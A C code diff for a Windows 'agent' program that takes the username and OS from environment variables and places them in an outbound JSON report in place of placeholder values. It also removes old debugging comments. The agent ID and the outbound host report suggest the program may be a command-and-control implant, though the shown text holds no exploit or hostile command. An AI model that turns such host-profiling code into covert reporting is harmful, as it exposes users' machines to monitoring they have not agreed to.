@@ -57,8 +57,8 @@ int main()
     }
 
     generate_uuid4(heapStorePointer->agentStore->agent_id);
-    set_current_username(heapStorePointer, get_env("USERNAME")); // does not work
-    // set_current_username(heapStorePointer, "USERNAME"); // works
+    set_current_username(heapStorePointer, get_env("USERNAME"));
+    set_os(heapStorePointer, get_env("OS"));
 
     // Example of setting the execution mode (you can do this at any point in your code)
     set_execution_mode(EXEC_MODE_SYNC, heapStorePointer); // Initially run synchronously
@@ -200,8 +200,7 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
     }
 
     // os
-    char *os = "placeholder_os";
-    OutboundJsonData->os = strdup(os);
+    OutboundJsonData->os = get_os(heapStorePointer);
     if (!OutboundJsonData->os)
     {
         DEBUG_LOG("Memory allocation failed for os.\n");
@@ -210,14 +209,7 @@ DWORD WINAPI execute(HeapStore *heapStorePointer)
         return;
     }
 
-    // possible that invalid pointer has passed to strdup
-    // OutboundJsonData->user = strdup(user);
-    // for whatever reason, accessing directly doesn't crash.
-    // copy from struct into OutboundJsonData->user
-    // OutboundJsonData->user = //strdup(heapStorePointer->currentUserStore->username);
-
     OutboundJsonData->user = get_current_username(heapStorePointer);
-
     if (!OutboundJsonData->user)
     {
         DEBUG_LOG("Memory allocation failed for user.\n");
